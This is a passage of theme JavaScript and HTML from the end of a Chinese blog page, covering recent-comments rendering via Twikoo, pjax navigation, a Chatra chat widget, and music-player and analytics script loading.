      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "vister@takake.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script>(() => {
  const isChatBtn = false
  const isChatHideShow = false

  if (isChatBtn) {
    const close = () => {
      Chatra('minimizeWidget')
      Chatra('hide')
    }

    const open = () => {
      Chatra('openChat', true)
      Chatra('show')
    }

    window.ChatraSetup = {
      startHidden: true
    }
  
    window.chatBtnFn = () => {
      const isShow = document.getElementById('chatra').classList.contains('chatra--expanded')
      isShow ? close() : open()
    }
  } else if (isChatHideShow) {
    window.chatBtn = {
      hide: () => {
        Chatra('hide')
      },
      show: () => {
        Chatra('show')
      }
    }
  }

  (function(d, w, c) {
    w.ChatraID = 'MYtmap9meYHQGdDTJ'
    var s = d.createElement('script')
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments)
    }
    s.async = true
    s.src = 'https://call.chatra.io/chatra.js'
    if (d.head) d.head.appendChild(s)
  })(document, window, 'Chatra')

})()</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>